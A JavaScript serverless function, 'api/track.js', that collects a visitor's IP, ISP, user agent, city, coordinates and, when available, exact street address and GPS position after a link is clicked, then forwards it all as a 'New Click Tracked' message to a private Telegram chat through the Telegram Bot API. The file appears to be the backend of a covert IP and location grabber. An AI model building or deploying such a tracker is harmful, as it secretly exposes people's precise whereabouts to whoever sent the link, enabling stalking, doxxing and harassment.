// api/track.js - Vercel serverless function with enhanced debugging
export default async function handler(req, res) {
  // Add CORS headers
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  // Handle preflight requests
  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  // Only allow POST requests
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  try {
    // Configuration - Replace with your actual values
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    console.log("Environment check:", {
      hasToken: !!TELEGRAM_BOT_TOKEN,
      hasChat: !!TELEGRAM_CHAT_ID,
      tokenLength: TELEGRAM_BOT_TOKEN ? TELEGRAM_BOT_TOKEN.length : 0,
    });

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error("Missing Telegram configuration");
      return res.status(500).json({
        error: "Server configuration error",
        details: "Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID",
      });
    }

    const data = req.body;
    console.log("Received data:", data);

    // Format exact address if available
    let exactLocationInfo = "";
    if (data.exactAddress) {
      const addr = data.exactAddress;
      exactLocationInfo = `
  
  📍 Exact Location (${
    data.accuracy ? `±${Math.round(data.accuracy)}m` : "High Accuracy"
  }):
  • Address: ${[addr.road, addr.house_number].filter(Boolean).join(" ")}
  • Neighborhood: ${addr.neighbourhood || "N/A"}
  • City: ${addr.city || addr.town || addr.village || "N/A"}
  • State: ${addr.state || "N/A"}
  • Postcode: ${addr.postcode || "N/A"}
  • Country: ${addr.country || "N/A"}
  • Google Maps: https://www.google.com/maps?q=${data.exactLatitude},${
        data.exactLongitude
      }`;
    }

    // Simple message format to avoid Markdown issues
    const message = `🎯 New Click Tracked
  
  📍 IP Location Info:
  • IP: ${data.ip || "Unknown"}
  • City: ${data.city || "Unknown"}
  • Region: ${data.region || "Unknown"}
  • Country: ${data.country || "Unknown"}
  • Postal Code: ${data.postal || "N/A"}
  • Timezone: ${data.timezone || "Unknown"}
  • Coordinates: ${data.latitude || "N/A"}, ${data.longitude || "N/A"}
  • Google Maps: https://www.google.com/maps?q=${data.latitude},${
      data.longitude
    }
  
  🌐 Network & Device:
  • ISP: ${data.isp || "Unknown"}
  • User Agent: ${
    data.userAgent ? data.userAgent.substring(0, 80) + "..." : "Unknown"
  }
  
  ⏰ Timestamp: ${data.timestamp || new Date().toISOString()}
  
  ${exactLocationInfo}`;

    console.log("Sending to Telegram...");

    // Send to Telegram with simpler format
    const telegramResponse = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          // Removed parse_mode to avoid formatting issues
        }),
      }
    );

    console.log("Telegram response status:", telegramResponse.status);

    if (!telegramResponse.ok) {
      const errorData = await telegramResponse.json();
      console.error("Telegram API error:", errorData);
      return res.status(500).json({
        error: "Failed to send to Telegram",
        details: errorData,
      });
    }

    const telegramResult = await telegramResponse.json();
    console.log("Telegram success:", telegramResult);

    // Return success
    return res.status(200).json({
      success: true,
      message: "Data sent successfully",
    });
  } catch (error) {
    console.error("Error processing request:", error);
    return res.status(500).json({
      error: "Failed to process request",
      details: error.message,
    });
  }
}
